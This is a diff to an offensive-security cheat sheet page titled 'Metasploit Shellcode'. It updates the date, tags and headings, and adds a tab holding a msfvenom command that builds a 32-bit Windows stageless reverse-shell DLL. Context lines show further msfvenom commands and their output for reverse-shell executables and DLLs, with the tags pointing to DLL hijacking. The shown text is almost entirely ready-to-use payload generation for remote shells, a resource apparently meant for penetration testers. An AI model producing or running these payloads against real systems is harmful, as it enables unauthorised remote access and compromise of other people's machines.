@@ -1,14 +1,14 @@
 ---
 title: "Metasploit Shellcode"
-date: 2024-6-26
-tags: ["Code Execution", "Metasploit", "Firewall", "Payload", "RCE", "Dll Hijacking", "Shellcode", "Reverse Shell", "Msfconsole", "Msfvenom"]
+date: 2025-7-29
+tags: ["Code Execution", "Metasploit", "Firewall", "Payload", "RCE", "Dll Hijacking", "Shellcode", "Reverse Shell", "Msfconsole", "Msfvenom", "Revshell"]
 ---
 
 ### Generate Shellcode
 
 <small>*Note: stageless payload can catch with nc directly*</small>
 
-#### Windows x64
+#### Windows x64 (64-bit)
 
 {{< tab set1 tab1 >}}Staged exe{{< /tab >}}
 {{< tab set1 tab2 >}}Stageless exe{{< /tab >}}
@@ -64,10 +64,11 @@ msfvenom -p windows/x64/shell_reverse_tcp -a x64 -f dll --platform windows LHOST
 
 {{< /tabcontent >}}
 
-#### Windows x86
+#### Windows x86 (32-bit)
 
 {{< tab set2 tab1 >}}Staged exe{{< /tab >}}
 {{< tab set2 tab2 >}}Stageless exe{{< /tab >}}
+{{< tab set2 tab3 >}}Stageless dll{{< /tab >}}
 {{< tabcontent set2 tab1 >}}
 
 ```console
@@ -93,6 +94,13 @@ $ msfvenom -p windows/shell_reverse_tcp -a x86 -f exe --platform windows LHOST=1
 No encoder specified, outputting raw payload
 Payload size: 324 bytes
 Final size of exe file: 73802 bytes
+```
+
+{{< /tabcontent >}}
+{{< tabcontent set2 tab3 >}}
+
+```console
+msfvenom -p windows/shell_reverse_tcp -a x86 -f dll --platform windows LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> EXITFUNC=thread > rev.dll
 ```
 
 {{< /tabcontent >}}
